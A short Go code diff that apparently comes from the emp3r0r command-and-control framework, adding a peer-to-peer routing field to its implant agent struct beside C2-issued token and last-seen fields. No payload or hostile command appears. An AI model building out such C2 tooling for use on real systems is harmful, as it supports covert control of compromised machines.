@@ -44,6 +44,7 @@ type Emp3r0rAgent struct {
 	LastSeen    time.Time        `cbor:"31,keyasint"` // last time the agent was seen
 	LastSeenRTT time.Duration    `cbor:"32,keyasint"` // last RTT of the agent
 	AgentToken  *AgentToken      `cbor:"36,keyasint"` // current token issued by C2
+	MeshRoute   string           `cbor:"37,keyasint"` // p2p routing role or gateway used by this agent
 }
 
 // AgentProcess process info of our agent
